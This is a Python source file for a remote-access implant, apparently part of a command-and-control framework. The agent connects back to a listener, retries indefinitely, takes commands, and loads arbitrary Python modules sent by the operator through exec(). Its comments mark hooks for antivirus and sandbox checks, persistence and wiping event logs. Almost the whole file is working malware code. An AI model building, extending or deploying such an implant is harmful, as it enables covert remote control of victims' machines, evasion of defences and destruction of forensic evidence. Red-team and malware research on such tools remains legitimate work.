import json
import socket
import time


class InternalPeerErrorError(Exception):
    pass


class InvalidPeerResponseError(Exception):
    pass


class PeerTimedOutError(Exception):
    pass


class PeerConnectionErroredOutError(Exception):
    pass


class ModuleLoader:
    def __init__(self):
        self._loaded_modules = {}

    def load_module(self, args, connection):
        if args["name"] in self._loaded_modules:
            connection.send_string(f"[-] Module \"{args['name']}\" is already loaded")
            return

        try:
            exec(args["source_code"], globals())
        except Exception as e:
            connection.send_json(
                {"success": False, "message": f"[-] Error loading module : {e}"},
            )
            return
        self._loaded_modules[args["name"]] = ModuleSource()
        connection.send_json(
            {"success": True, "message": f"[+] Loaded module : {args['name']}"},
        )

    def unload_module(self, args, connection):
        if args["name"] in self._loaded_modules:
            del self._loaded_modules[args["name"]]
            connection.send_json(
                {"success": True, "message": f"[+] Unloaded module : {args['name']}"},
            )
        else:
            connection.send_json(
                {
                    "success": False,
                    "message": f"[-] Module \"{args['name']}\" is not currently loaded",
                },
            )

    def reload_module(self, args, connection):
        if args["name"] not in self._loaded_modules:
            connection.send_json(
                {
                    "success": False,
                    "message": f"[-] Module \"{args['name']}\" is not currently loaded",
                },
            )
            return

        try:
            exec(args["source_code"], globals())
        except Exception as e:
            connection.send_json(
                {"success": False, "message": f"[-] Error reloading module : {e}"},
            )
            return
        self._loaded_modules[args["name"]] = ModuleSource()
        connection.send_json(
            {"success": True, "message": f"[+] Reloaded module : {args['name']}"},
        )

    def run_module(self, command, args, connection):
        self._loaded_modules[command].run_module(command, args, connection)

    def get_loaded_module_names(self):
        return list(self._loaded_modules.keys())


class Encoder:
    def __init__(self):
        pass

    def encode_data(self, data):
        """
        For standardization, encode_data always outputs bytes, any errors raised during
        encoding should raise InvalidPeerResponseError since the client doesn't speak
        the protocol. Encoder needs to distinguish between bytes and non bytes input
        for its encoding
        """
        try:
            if not isinstance(data, bytes):
                return data.encode()
            return data
        except Exception:
            raise InvalidPeerResponseError

    def decode_data(self, data):
        """
        For standardization, decode_data always outputs bytes, any errors raised during
        decoding should raise InvalidPeerResponseError since the client doesnt speak
        the protocol
        """
        try:
            return data
        except Exception:
            raise InvalidPeerResponseError


class Connection:
    def __init__(self, connection):
        self._connection = connection

        self._encoder = Encoder()

    def close_connection(self):
        try:
            self._connection.close()
            return True
        except Exception:
            return False

    def send_string(self, data):
        try:
            encoded_data = self._encoder.encode_data(data)
            self._connection.sendall(
                b"s:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def send_bytes(self, data):
        try:
            encoded_data = self._encoder.encode_data(data)
            self._connection.sendall(
                b"b:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def send_json(self, data):
        try:
            encoded_data = self._encoder.encode_data(json.dumps(data))
            self._connection.sendall(
                b"j:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def send_exception(self, data):
        try:
            encoded_data = self._encoder.encode_data(json.dumps(data))
            self._connection.sendall(
                b"e:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def recv(self):
        initial_timeout = None
        chunk_timeout = None
        chunk = 4096

        self._connection.settimeout(initial_timeout)

        try:
            received_header = False
            initial_bytes = []
            for _ in range(1024):
                single_byte = self._connection.recv(1)
                initial_bytes.append(single_byte)
                if initial_bytes.count(b":") == 2:
                    received_header = True
                    break
            if not received_header:
                raise InvalidPeerResponseError(b"".join(initial_bytes))
        except TimeoutError:
            if initial_bytes:
                raise InvalidPeerResponseError(b"".join(initial_bytes))
            else:
                raise PeerTimedOutError
        except ConnectionError:
            raise PeerConnectionErroredOutError(b"".join(initial_bytes))

        try:
            header = b"".join(initial_bytes)
            msg_type = header.split(b":")[0].decode()
            msg_len = int(header.split(b":")[1])
        except ValueError:
            raise InvalidPeerResponseError(b"".join(initial_bytes))

        received_data = []
        received_data_len = 0
        self._connection.settimeout(chunk_timeout)
        while True:
            try:
                if msg_len - received_data_len > 1024:
                    chunk = self._connection.recv(1024)
                    received_data.append(chunk)
                    received_data_len += len(chunk)
                else:
                    chunk = self._connection.recv(msg_len - received_data_len)
                    received_data.append(chunk)
                    received_data_len += len(chunk)
            except TimeoutError:
                if received_data:
                    raise InvalidPeerResponseError(header + b"".join(received_data))
                else:
                    raise PeerTimedOutError(header + b"".join(received_data))
            except ConnectionError:
                raise PeerConnectionErroredOutError(header + b"".join(received_data))

            if received_data_len == msg_len:
                break
        self._connection.settimeout(None)

        if msg_type == "s":
            output_data = self._encoder.decode_data(b"".join(received_data)).decode()
        elif msg_type == "j":
            output_data = json.loads(
                self._encoder.decode_data(b"".join(received_data)).decode(),
            )
        elif msg_type == "b":
            output_data = self._encoder.decode_data(b"".join(received_data))
        elif msg_type == "e":
            output_data = self._encoder.decode_data(b"".join(received_data)).decode()
            raise InternalPeerErrorError(output_data)
        else:
            raise InvalidPeerResponseError(b"".join(received_data))
        return msg_type, output_data


class Agent:
    def __init__(self, remote_host: str, remote_port: int) -> None:
        self._remote_host = remote_host
        self._remote_port = remote_port

    def _agent_startup(self) -> bool:
        """
        Agent startup logic (independent of listener), runs before all other code,
        check for AV, sandbox, automatically gain persistence, etc. If returns false,
        agent will not start
        """
        return True

    def _agent_loop(self) -> None:
        """
        Agent main loop, create connection, receive commands, executes commands and
        returns results to listener
        """
        module_loader = ModuleLoader()

        while True:
            try:
                s = socket.socket()
                s.connect((self._remote_host, self._remote_port))
                connection = Connection(s)
                time.sleep(5)
                break
            except TimeoutError:
                continue
            except Exception:
                continue

        while True:
            try:
                _, data = connection.recv()
                command, args = data["command"], data["args"]

                if command == "exit":
                    connection.send_string(f"[+] Agent is exiting...")
                    return True
                elif command == "disconnect":
                    connection.send_string(f"[+] Agent is disconnecting...")
                    return False
                elif command == "sleep":
                    connection.send_string(
                        f"[+] Agent is sleeping for {args['duration']} seconds...",
                    )
                    time.sleep(int(args["duration"]))
                elif command == "load":
                    module_loader.load_module(args, connection)
                elif command == "unload":
                    module_loader.unload_module(args, connection)
                elif command == "reload":
                    module_loader.reload_module(args, connection)
                elif command == "list":
                    if module_loader.get_loaded_module_names():
                        connection.send_string(
                            "[*] Loaded modules : \n"
                            + "\n".join(
                                [
                                    " | [*] " + i
                                    for i in module_loader.get_loaded_module_names()
                                ],
                            ),
                        )
                    else:
                        connection.send_string("[-] No modules currently loaded")
                elif command not in module_loader.get_loaded_module_names():
                    connection.send_string(f"[-] Invalid command : {command}")
                else:
                    module_loader.run_module(command, args, connection)
            except (
                InvalidPeerResponseError,
                PeerTimedOutError,
                PeerConnectionErroredOutError,
                InternalPeerErrorError,
            ):  # Connection is confirmed to be dead or tampered with here, break out and reattempt connection
                return False
            # Connection is still working but an unexpected error occurred, inform
            # listener
            except Exception as exc:
                connection.send_exception(str(exc))

    def _agent_cleanup(self) -> bool:
        """
        Agent cleanup logic (independent of listener), runs at the very end, remove
        temporary files, regkeys, wipe event logs, etc
        """
        return True

    def agent_run(self):
        if self._agent_startup():
            while True:
                intentional_exit = self._agent_loop()
                if intentional_exit:
                    break
            self._agent_cleanup()


if __name__ == "__main__":
    agent = Agent("127.0.0.1", 9999)
    agent.agent_run()
